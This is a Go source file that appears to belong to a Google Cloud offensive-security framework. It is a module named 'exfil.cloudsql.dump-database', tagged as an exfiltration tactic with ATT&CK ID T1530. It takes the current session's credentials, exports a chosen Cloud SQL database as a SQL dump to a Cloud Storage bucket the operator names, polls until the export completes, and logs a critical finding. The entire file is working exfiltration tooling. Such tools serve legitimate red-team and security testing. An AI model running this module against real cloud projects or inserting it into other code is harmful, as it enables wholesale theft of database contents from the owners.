package cloudsql

import (
	"context"
	"fmt"
	"time"

	sqladmin "google.golang.org/api/sqladmin/v1beta4"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&DumpDatabase{})
}

// DumpDatabase exports a Cloud SQL database to a GCS bucket.
type DumpDatabase struct{}

func (m *DumpDatabase) Info() module.Info {
	return module.Info{
		Name:         "exfil.cloudsql.dump-database",
		Tactic:       module.TacticExfil,
		Service:      "cloudsql",
		Description:  "Export a Cloud SQL database to a GCS bucket for exfiltration",
		RequiresAuth: true,
		AttackID:     "T1530",
	}
}

func (m *DumpDatabase) Run(ctx module.RunContext) error {
	instance := ctx.Flags["instance"]
	database := ctx.Flags["database"]
	bucket := ctx.Flags["bucket"]

	if instance == "" || database == "" || bucket == "" {
		output.Warn("Usage: run exfil.cloudsql.dump-database --instance <name> --database <db> --bucket <gcs-bucket>")
		output.Info("Exports a Cloud SQL database as SQL to a GCS bucket.")
		return nil
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := sqladmin.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create sqladmin client: %w", err)
	}

	timestamp := time.Now().UTC().Format("20060102-150405")
	exportURI := fmt.Sprintf("gs://%s/%s-%s-%s.sql", bucket, instance, database, timestamp)

	output.Info("Exporting %s/%s to %s", instance, database, exportURI)

	req := &sqladmin.InstancesExportRequest{
		ExportContext: &sqladmin.ExportContext{
			FileType:  "SQL",
			Uri:       exportURI,
			Databases: []string{database},
		},
	}

	op, err := svc.Instances.Export(project, instance, req).Do()
	if err != nil {
		return fmt.Errorf("start export: %w", err)
	}

	output.Info("Export operation started: %s", op.Name)

	// Poll the operation until complete.
	for {
		opStatus, err := svc.Operations.Get(project, op.Name).Do()
		if err != nil {
			return fmt.Errorf("poll operation: %w", err)
		}

		if opStatus.Status == "DONE" {
			if opStatus.Error != nil && len(opStatus.Error.Errors) > 0 {
				return fmt.Errorf("export failed: %s", opStatus.Error.Errors[0].Message)
			}
			break
		}

		output.Info("Operation status: %s", opStatus.Status)
		time.Sleep(5 * time.Second)
	}

	output.Success("Database exported to %s", exportURI)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "exfil.cloudsql.dump-database",
			Severity:    module.SevCritical,
			Title:       "Cloud SQL database exported",
			Description: fmt.Sprintf("Exported database %s from instance %s to %s", database, instance, exportURI),
			Resource:    instance,
			Project:     project,
		}
	}

	return nil
}
